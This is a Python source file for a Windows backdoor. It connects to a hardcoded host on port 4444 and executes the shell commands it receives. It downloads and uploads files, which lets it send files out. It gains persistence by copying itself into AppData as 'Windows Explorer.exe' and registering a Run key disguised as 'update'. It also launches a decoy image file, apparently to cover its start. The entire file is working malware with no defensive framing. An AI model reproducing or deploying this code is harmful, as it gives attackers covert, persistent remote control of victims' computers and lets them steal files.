#!/root/anaconda3/bin  python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor(object):
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, 4444))

    def become_persistent(self):
        evil_file_location = os.environ['appdata'] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' +
                            evil_file_location + '"', shell=True)

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def reliable_receive(self, json_data=''):
        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode())
        except AttributeError:
            json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def read_file(self, path):
        with open(path, 'rb') as f:
            return base64.b64encode(f.read())

    def write_file(self, path, content):
        with open(path, 'wb') as f:
            f.write(base64.b64decode(content.encode()))
            return '[+] Upload successful.'

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1 and len(command[1].strip()) > 0:
                    command_result = self.change_working_directory_to(
                        command[1])
                elif command[0] == 'download':
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except:
                command_result = '[-] Error during comand execution.'
            self.reliable_send(command_result)


if __name__ == '__main__':
    evil_file = 'z:/image.jpg'
    subprocess.Popen(evil_file,shell=True)
    try:
        b_d = Backdoor('192.168.1.124', 4444)
        b_d.run()
    except Exception:
        sys.exit()
